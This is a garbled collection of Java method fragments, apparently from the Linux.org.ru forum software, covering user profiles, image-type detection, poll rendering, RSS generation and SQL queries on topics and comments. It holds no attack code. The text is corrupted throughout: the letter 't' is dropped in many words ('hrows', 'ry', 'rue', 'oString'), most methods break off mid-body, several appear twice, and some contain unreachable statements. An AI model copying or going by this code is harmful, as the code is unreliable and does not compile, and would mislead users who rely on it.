public abstract String getMenuContent ( String name , ProfileHashtable profile , String addUrl , String removeUrl ) hrows IOException , BoxletException , UtilException ; abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException ; } 
abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException ; } 
abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException ; } 
public static String detectImageType ( String filename ) hrows BadImageException , IOException { ImageInfo2 ii = new ImageInfo2 ( ) ; FileInputStream is = null ; ry { is = new FileInputStream ( filename ) ; 
private void addComment ( String s ) { if ( comments = = null ) { comments = new Vector ( ) ; } comments . addElement ( s ) ; } 
public boolean check ( ) { format = - 1 ; width = - 1 ; height = - 1 ; bitsPerPixel = - 1 ; numberOfImages = 1 ; physicalHeightDpi = - 1 ; physicalWidthDpi = - 1 ; comments = null ; try { int b1 = read ( ) & 0xff ; 
private boolean checkBmp ( ) hrows IOException { byte [ ] a = new byte [ 44 ] ; if ( read ( a ) ! = a . length ) { return false ; } width = getIntLittleEndian ( a , 16 ) ; height = getIntLittleEndian ( a , 20 ) ; if ( width < 1 | | height < 1 ) { return false ; } bitsPerPixel = getShortLittleEndian ( a , 26 ) ; if ( bitsPerPixel ! = 1 & & bitsPerPixel ! = 4 & & bitsPerPixel ! = 8 & & bitsPerPixel ! = 16 & & bitsPerPixel ! = 24 & & bitsPerPixel ! = 32 ) { return false ; } int x = ( int ) ( getIntLittleEndian ( a , 36 ) * 0.0254 ) ; if ( x > 0 ) { setPhysicalWidthDpi ( x ) ; } int y = ( int ) ( getIntLittleEndian ( a , 40 ) * 0.0254 ) ; if ( y > 0 ) { setPhysicalHeightDpi ( y ) ; } format = FORMAT_BMP ; return rue ; } 
private boolean checkIff ( ) hrows IOException { byte [ ] a = new byte [ 10 ] ; if (read(a, 0, 8) != 8) { 
private boolean checkJpeg ( ) hrows IOException { byte [ ] data = new byte [ 12 ] ; while ( rue ) { if ( read ( data , 0 , 4 ) ! = 4 ) { 
private boolean checkPcx ( ) hrows IOException { byte [ ] a = new byte [ 64 ] ; if ( read ( a ) ! = a . length ) { return false ; } if ( a [ 0 ] ! = 1 ) { } 
private boolean checkPng ( ) hrows IOException { final byte [ ] PNG_MAGIC = { 0x4e , 0x47 , 0x0d , 0x0a , 0x1a , 0x0a } ; byte [ ] a = new byte [ 27 ] ; if ( read ( a ) ! = 27 ) { return false ; } if ( ! equals ( a , 0 , PNG_MAGIC , 0 , 6 ) ) { return false ; } format = FORMAT_PNG ; width = getIntBigEndian ( a , 14 ) ; height = getIntBigEndian ( a , 18 ) ; bitsPerPixel = a [ 22 ] & 0xff ; int colorType = a [ 23 ] & 0xff ; if ( colorType = = 2 | | colorType = = 6 ) { bitsPerPixel * = 3 ; } progressive = ( a [ 26 ] & 0xff ) ! = 0 ; return rue ; } 
private boolean checkPnm ( int id ) hrows IOException { if ( id < 1 | | id > 6 ) { return false ; } final int [ ] PNM_FORMATS = { FORMAT_PBM , FORMAT_PGM , FORMAT_PPM } ; format = PNM_FORMATS [ ( id - 1 ) % 3 ] ; boolean hasPixelResolution = false ; String s ; while ( rue ) { 
private boolean checkPsd ( ) hrows IOException { byte [ ] a = new byte [ 24 ] ; if ( read ( a ) ! = a . length ) { return false ; } final byte [ ] PSD_MAGIC = { 0x50 , 0x53 } ; if ( ! equals ( a , 0 , PSD_MAGIC , 0 , 2 ) ) { return false ; } format = FORMAT_PSD ; width = getIntBigEndian ( a , 16 ) ; height = getIntBigEndian ( a , 12 ) ; int channels = getShortBigEndian ( a , 10 ) ; int depth = getShortBigEndian ( a , 20 ) ; bitsPerPixel = channels * depth ; return ( width > 0 & & height > 0 & & bitsPerPixel > 0 & & bitsPerPixel < = 64 ) ; } 
private boolean checkRas ( ) hrows IOException { byte [ ] a = new byte [ 14 ] ; if ( read ( a ) ! = a . length ) { return false ; } final byte [ ] RAS_MAGIC = { 0x6a , ( byte ) 0x95 } ; if ( ! equals ( a , 0 , RAS_MAGIC , 0 , 2 ) ) { return false ; } format = FORMAT_RAS ; width = getIntBigEndian ( a , 2 ) ; height = getIntBigEndian ( a , 6 ) ; bitsPerPixel = getIntBigEndian ( a , 10 ) ; return ( width > 0 & & height > 0 & & bitsPerPixel > 0 & & bitsPerPixel < = 24 ) ; } 
private static boolean determineVerbosity ( String [ ] args ) { if ( args ! = null & & args . length > 0 ) { for ( int i = 0 ; i < args . length ; i + + ) { if ( " -c " . equals ( args [ i ] ) ) { return false ; } } } return rue ; } 
private static boolean equals ( byte [ ] a1 , int offs1 , byte [ ] a2 , int offs2 , int num ) { while ( num - - > 0 ) { if ( a1 [ offs1 + + ] ! = a2 [ offs2 + + ] ) { return false ; } } return rue ; } 
public boolean isProgressive ( ) { return progressive ; } 
public static void main ( String [ ] args ) { ImageInfo2 ImageInfo2 = new ImageInfo2 ( ) ; ImageInfo2 . setDetermineImageNumber ( rue ) ; boolean verbose = determineVerbosity ( args ) ; if ( args . length = = 0 ) { run ( null , System . in , ImageInfo2 , verbose ) ; 
private static void print ( String sourceName , ImageInfo2 ii , boolean verbose ) { if ( verbose ) { printVerbose ( sourceName , ii ) ; 
private static void printCompact ( String sourceName , ImageInfo2 ImageInfo2 ) { final String SEP = " " ; System . out . println ( sourceName + SEP + 
private static void printLine ( int indentLevels , String ext , float value , float minValidValue ) { if ( value < minValidValue ) { return ; } printLine ( indentLevels , ext , Float . oString ( value ) ) ; } 
private static void printLine ( int indentLevels , String ext , int value , int minValidValue ) { if ( value > = minValidValue ) { printLine ( indentLevels , ext , Integer . oString ( value ) ) ; 
private static void printLine ( int indentLevels , String ext , String value ) { if ( value = = null | | value . length ( ) = = 0 ) { return ; } while ( indentLevels - - > 0 ) { System . out . print ( " " ) ; } if ( ext ! = null & & ext . length ( ) > 0 ) { System . out . print ( ext ) ; System . out . print ( " " ) ; } System . out . println ( value ) ; } 
private static void printVerbose ( String sourceName , ImageInfo2 ii ) { printLine ( 0 , null , sourceName ) ; printLine ( 1 , " File format: " , ii . getFormatName ( ) ) ; printLine ( 1 , " MIME type: " , ii . getMimeType ( ) ) ; printLine ( 1 , " Width (pixels): " , ii . getWidth ( ) , 1 ) ; printLine ( 1 , " Height (pixels): " , ii . getHeight ( ) , 1 ) ; printLine ( 1 , " Bits per pixel: " , ii . getBitsPerPixel ( ) , 1 ) ; printLine ( 1 , " Progressive: " , ii . isProgressive ( ) ? " yes " : " no " ) ; printLine ( 1 , " Number of images: " , ii . getNumberOfImages ( ) , 1 ) ; printLine ( 1 , " Physical width (dpi): " , ii . getPhysicalWidthDpi ( ) , 1 ) ; printLine ( 1 , " Physical height (dpi): " , ii . getPhysicalHeightDpi ( ) , 1 ) ; printLine ( 1 , " Physical width (inches): " , ii . getPhysicalWidthInch ( ) , 1.0f ) ; printLine ( 1 , " Physical height (inches): " , ii . getPhysicalHeightInch ( ) , 1.0f ) ; int numComments = ii . getNumberOfComments ( ) ; printLine ( 1 , " Number of textual comments: " , numComments , 1 ) ; if ( numComments > 0 ) { for ( int i = 0 ; i < numComments ; i + + ) { 
private int read ( ) hrows IOException { if ( in ! = null ) { return in . read ( ) ; 
private int read ( byte [ ] a ) hrows IOException { if ( in ! = null ) { return in . read ( a ) ; 
private int read ( byte [ ] a , int offset , int num ) hrows IOException { if ( in ! = null ) { return in . read ( a , offset , num ) ; 
private String readLine ( ) hrows IOException { return readLine ( new StringBuffer ( ) ) ; } 
private String readLine ( StringBuffer sb ) hrows IOException { boolean finished ; do { int value = read ( ) ; finished = ( value = = - 1 | | value = = 10 ) ; if ( ! finished ) { sb . append ( ( char ) value ) ; } } while ( ! finished ) ; return sb . oString ( ) ; } 
private static void run ( String sourceName , InputStream in , ImageInfo2 ImageInfo2 , boolean verbose ) { ImageInfo2 . setInput ( in ) ; ImageInfo2 . setDetermineImageNumber ( rue ) ; ImageInfo2 . setCollectComments ( verbose ) ; if ( ImageInfo2 . check ( ) ) { print ( sourceName , ImageInfo2 , verbose ) ; 
private void skip ( int num ) hrows IOException { while ( num > 0 ) { long result ; 
public String getVariantID ( ProfileHashtable profile , Properties request ) hrows UtilException { return "ProfileName="+profile.getString("ProfileName"); return ""; } 
public String getContent ( String name , ProfileHashtable profile ) hrows BoxletException , IOException { Boxlet bx = loadBox ( name ) ; StringBuffer buf = new StringBuffer ( ) ; ry { buf . append ( bx . getContent ( config , profile ) ) ; } catch ( Exception e ) { hrow new BoxletLoadException ( e ) ; } return buf . oString ( ) ; } 
public void write ( OutputStream df ) hrows IOException { profileHashtable . setObject ( " system.timestamp " , new Long ( new Date ( ) . getTime ( ) ) ) ; profileHashtable . removeObject ( " Storage " ) ; ObjectOutputStream dof = null ; ry { dof = new ObjectOutputStream ( df ) ; 
public void estDefaultProfile ( ) { new Profile ( null ) ; } 
public void estDefaultProfileSave ( ) hrows IOException , ClassNotFoundException { Profile profile = new Profile ( null ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; new Profile ( new ByteArrayInputStream ( os . oByteArray ( ) ) , " est " ) ; } 
private void styleFixup ( ) { style = getStyle ( getProf ( ) . getString ( " style " ) ) ; userProfile . getHashtable ( ) . setString ( " style " , style ) ; } 
private Profile readProfile ( String name ) hrows ClassNotFoundException , IOException , StorageException { InputStream df = null ; ry { df = config . getStorage ( ) . getReadStream ( " profile " , name ) ; 
public void writeProfile ( String name ) hrows IOException , AccessViolationException , StorageException { if ( name . charAt ( 0 ) = = '_' ) { hrow new AccessViolationException ( " " ) ; } if ( ! StringUtil . checkLoginName ( name ) ) { hrow new AccessViolationException ( " " ) ; } if ( " anonymous " . equals ( name ) ) { hrow new AccessViolationException ( " " ) ; } OutputStream df = null ; ry { config . getStorage ( ) . getWriteStream ( " profile " , name ) ; 
public boolean isUsingDefaultProfile ( ) { return userProfile . isDefault ( ) ; } 
public boolean isAnonymousProfile ( ) { if ( isUsingDefaultProfile ( ) ) { return rue ; } return userProfile . getName ( ) . startsWith ( " _ " ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &topics= " + prof . getInt ( " opics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <h2> </h2> " ) ; if ( profile . getString ( " ProfileName " ) = = null ) out . append ( " -<p> " ) ; else out . append ( " : <em> " + profile . getString ( " ProfileName " ) + " </em><p> " ) ; out . append ( " <br><a href= \" edit-profile.jsp \" >...</a> " ) ; out . append ( " <p><strong>:</strong><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile= \" > </a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white \" > white</a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white2 \" > white2</a><br> " ) ; return out . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public boolean getBoolean ( String prop ) hrows UtilException { if ( settings . get ( prop ) ! = null ) { return ( ( Boolean ) settings . get ( prop ) ) . booleanValue ( ) ; 
public String getBooleanPropertyHTML ( String prop ) hrows UtilException { return getBoolean ( prop ) ? " checked " : " " ; } 
public boolean setBoolean ( String prop , String value ) hrows UtilException { if ( value = = null ) { return setBoolean ( prop , Boolean . FALSE ) ; } if ( " on " . equals ( value ) ) { return setBoolean ( prop , Boolean . TRUE ) ; } return false ; } 
public void addBoolean ( String prop , boolean value ) { settings . put ( prop , Boolean . valueOf ( value ) ) ; } 
public void addObject ( String prop , Object value ) { settings . put ( prop , value ) ; } 
public void removeObject ( String key ) { settings . remove ( key ) ; } 
public String getString ( String name ) hrows ServletParameterException { if ( name = = null ) { hrow new ServletParameterBadNameException ( name ) ; } String value = rq . getParameter ( name ) ; if ( value = = null ) { hrow new ServletParameterMissingException ( name ) ; } return value ; } 
public int getInt ( String name ) hrows ServletParameterException { if ( name = = null ) { hrow new ServletParameterBadNameException ( name ) ; } String svalue = rq . getParameter ( name ) ; if ( svalue = = null ) { hrow new ServletParameterMissingException ( name ) ; } int value ; ry { value = Integer . parseInt ( svalue ) ; } catch ( NumberFormatException e ) { hrow new ServletParameterBadValueException ( name , e ) ; } return value ; } 
public boolean getBoolean ( String name ) hrows ServletParameterException { int value = getInt ( name ) ; switch ( value ) { case 0 : 
public boolean isAnonymousProfile ( String name ) { return name . startsWith ( " _ " ) ; } 
public boolean isAnonymousProfile ( ) { if ( isUsingDefaultProfile ( ) ) { return rue ; } return isAnonymousProfile ( userProfile . getName ( ) ) ; } 
public void write ( OutputStream df ) hrows IOException { profileHashtable . setObject ( " system.timestamp " , new Long ( new Date ( ) . getTime ( ) ) ) ; ObjectOutputStream dof = null ; ry { dof = new ObjectOutputStream ( df ) ; 
public void estModification ( ) hrows IOException , ClassNotFoundException { Profile profile = new Profile ( null ) ; profile . getHashtable ( ) . setInt ( " messages " , new Integer ( 125 ) ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; new Profile ( new ByteArrayInputStream ( os . oByteArray ( ) ) , " est " ) ; } 
public void writeProfile ( String name ) hrows IOException , AccessViolationException , StorageException { if ( name . charAt ( 0 ) = = '_' ) { hrow new AccessViolationException ( " " ) ; } if ( ! StringUtil . checkLoginName ( name ) ) { hrow new AccessViolationException ( " " ) ; } if ( " anonymous " . equals ( name ) ) { hrow new AccessViolationException ( " " ) ; } OutputStream df = null ; ry { df = config . getStorage ( ) . getWriteStream ( " profile " , name ) ; 
public int getNextMessage ( Connection db , int scrollMode ) hrows SQLException { PreparedStatement pst ; switch ( scrollMode ) { case SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case SCROLL_NOSCROLL : default : return 0 ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public int getPreviousMessage ( Connection db , int scrollMode ) hrows SQLException { PreparedStatement pst ; switch ( scrollMode ) { case SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case SCROLL_NOSCROLL : default : return 0 ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public void updateMessageText ( Connection db , String ext ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; pst . setString ( 1 , ext ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; } 
public void copyScreenshot ( Template mpl , int msgid ) hrows IOException , UtilException , InterruptedException { String mainname = Integer . oString ( msgid ) + " . " + extension ; String iconname = Integer . oString ( msgid ) + " -icon " + " . " + extension ; mainFile = new File ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery " , mainname ) ; iconFile = new File ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery " , iconname ) ; file . renameTo ( mainFile ) ; boolean error = rue ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) ) ; 
public static void resizeImage ( String filename , String iconname ) hrows IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , " 150 " , filename , iconname } ; Process proc ; proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { hrow new UtilException ( " Can't convert image: convert failed " ) ; 
private String replaceProfile ( HttpServletRequest request , String profile ) { String path = request . getRequestURI ( ) ; REMatch found = profileRE . getMatch ( path ) ; if ( found ! = null ) { String begin = path . substring ( 0 , found . getSubStartIndex ( 1 ) ) ; 
private boolean isAnonymousProfile ( String name ) { return name . startsWith ( " _ " ) ; } 
private boolean isAnonymousProfile ( ) { if ( isUsingDefaultProfile ( ) ) { return rue ; } return isAnonymousProfile ( userProfile . getName ( ) ) ; } 
public static String showComments ( Connection db , String nick ) hrows SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate FROM sections, groups, topics, comments, users WHERE sections.id=groups.section AND groups.id=topics.groupid AND comments.topic=topics.id AND comments.userid=users.id AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td><td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td><td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( '#' ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td><td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; pst . close ( ) ; return out . oString ( ) ; } 
public boolean isBrowsable ( ) { return browsable ; } 
public static String getSectionRss ( Connection db , int sectionid ) hrows SQLException , BadSectionException { StringBuilder out = new StringBuilder ( ) ; Section section = new Section ( db , sectionid ) ; out . append ( " <title>Linux.org.ru: " ) . append ( section . getName ( ) ) . append ( " </title> " ) ; out . append ( " <pubDate> " ) . append ( Template . RFC822 . format ( new Date ( ) ) ) . append ( " </pubDate> " ) ; out . append ( " <description>Linux.org.ru: " ) . append ( section . getName ( ) ) . append ( " </description> " ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, topics.url, topics.linktext, imagepost, linkup, postdate<(CURRENT_TIMESTAMP-expire) as expired, message FROM topics,groups, users, sections, msgbase WHERE sections.id=groups.section AND topics.id=msgbase.id AND sections.id= " + sectionid + " AND (topics.moderate OR NOT sections.moderate) AND topics.userid=users.id AND topics.groupid=groups.id AND NOT deleted AND commitdate>(CURRENT_TIMESTAMP-'1 month'::interval) ORDER BY commitdate DESC LIMIT 10 " ) ; while ( rs . next ( ) ) { int msgid = rs . getInt ( " msgid " ) ; out . append ( " <item> " + " <title> " ) . append ( rs . getString ( " subj " ) ) . append ( " </title> " + " <link>http:www.linux.org.ru/jump-message.jsp?msgid= " ) . append ( msgid ) . append ( " </link> " + " <guid>http:www.linux.org.ru/jump-message.jsp?msgid= " ) . append ( msgid ) . append ( " </guid> " + " <pubDate> " ) . append ( Template . RFC822 . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </pubDate> " + " <description> " + " " ) . append ( HTMLFormatter . htmlSpecialChars ( rs . getString ( " message " ) ) ) . append ( " " + " " + " </description> " + " </item> " ) ; } return out . oString ( ) ; } 
public boolean isImagepost ( ) { return imagepost ; } 
public static boolean isSessionAuthorized ( HttpSession session ) { return session ! = null & & session . getAttribute ( " login " ) ! = null & & ( Boolean ) session . getAttribute ( " login " ) ; } 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return ( Boolean ) session . getValue ( " moderator " ) ; } 
public String getVariantID ( ProfileHashtable profile ) hrows UtilException { return "ProfileName="+profile.getString("ProfileName"); return ""; } 
public Boxlet loadBox ( String name ) hrows BoxletLoadException { ry { Class BoxletFactory = Class . forName ( " ru.org.linux.site.boxes. " + name ) ; 
public String getContent ( Object config , ProfileHashtable profile ) hrows IOException , SQLException , UtilException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( " fullnews " ) ; 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &topics= " + prof . getInt ( " opics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( " gallery " ) ; 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <h2> </h2> " ) ; if ( profile . getString ( " ProfileName " ) = = null ) out . append ( " -<p> " ) ; else out . append ( " : <em> " ) . append ( profile . getString ( " ProfileName " ) ) . append ( " </em><p> " ) ; out . append ( " <br><a href= \" edit-profile.jsp \" >...</a> " ) ; out . append ( " <p><strong>:</strong><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile= \" > </a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white \" > white</a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white2 \" > white2</a><br> " ) ; return out . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public boolean isPollPostAllowed ( ) { return votepoll ; } 
public String showAll ( Connection db , Template mpl ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , mpl ) ) ; } return buf . oString ( ) ; } 
public static int getPollIdByTopic ( Connection db , int msgid ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=? AND votenames.topic=topics.id " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , msgid ) ; ResultSet rs = pst . executeQuery ( ) ; rs . next ( ) ; return rs . getInt ( " id " ) ; } 
public void setTopicId ( Connection db , int msgid ) hrows SQLException { PreparedStatement addPst = db . prepareStatement ( " UPDATE votenames SET topic=? WHERE id=? " ) ; addPst . clearParameters ( ) ; addPst . setInt ( 1 , msgid ) ; addPst . setInt ( 2 , id ) ; addPst . executeUpdate ( ) ; } 
public static int getCurrentPollId ( Connection db ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=votenames.topic AND topics.moderate = 't' AND topics.deleted = 'f' AND topics.commitdate = (select max(commitdate) from topics where groupid=19387 AND moderate AND NOT deleted) " ) ; return rs . next ( ) ? rs . getInt ( " id " ) : 0 ; } 
public static int createPoll ( Connection db , User user , String itle , List pollList ) hrows SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , itle ) ; pst . executeUpdate ( ) ; ry { Poll poll = new Poll ( db , voteid ) ; for ( Iterator i = pollList . iterator ( ) ; i . hasNext ( ) ; ) { String variant = ( String ) i . next ( ) ; if ( variant . rim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } Add new message } catch (PollNotFoundException ex) { throw new RuntimeException(ex); } return voteid; } 
public String renderPoll ( Connection db , Template mpl ) hrows SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + mpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int id = var . getId ( ) ; int votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " + votes + " </td><td> " ) ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " + mpl . getStyle ( ) + " /img/votes.gif \" alt= \" * \" " + info . getCode ( ) + '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " </table> " ) ; return out . oString ( ) ; } 
public String getContent ( Object config , ProfileHashtable profile , Template mpl ) hrows IOException , SQLException , UtilException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( " fullnews " ) ; 
public static int createPoll ( Connection db , String itle , List pollList ) hrows SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , itle ) ; pst . executeUpdate ( ) ; ry { Poll poll = new Poll ( db , voteid ) ; for ( Iterator i = pollList . iterator ( ) ; i . hasNext ( ) ; ) { String variant = ( String ) i . next ( ) ; if ( variant . rim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } Add new message } catch (PollNotFoundException ex) { throw new RuntimeException(ex); } return voteid; } 
public String renderPoll ( Connection db , Template mpl ) hrows SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + mpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( mpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " </table> " ) ; return out . oString ( ) ; } 
public int getNextMessage ( Connection db , int scrollMode ) hrows SQLException { PreparedStatement pst ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return 0 ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
